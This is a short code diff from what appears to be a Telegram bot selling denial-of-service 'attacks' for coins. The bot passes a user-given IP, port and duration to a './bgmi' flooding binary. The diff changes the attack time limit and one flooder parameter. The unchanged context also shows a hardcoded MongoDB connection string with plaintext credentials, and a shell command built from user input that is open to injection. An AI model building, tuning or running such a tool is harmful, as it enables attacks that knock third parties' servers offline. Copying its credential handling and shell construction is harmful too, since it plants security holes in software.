@@ -16,7 +16,7 @@ MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "legacy10"
 COLLECTION_NAME = "users"
 attack_in_progress = False
-ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 ATTACK_COOLDOWN = 60  # Cooldown period in seconds (5 minutes)
 
@@ -195,7 +195,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {300} {1200}"
+        command = f"./bgmi {ip} {port} {duration} {350} {1200}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
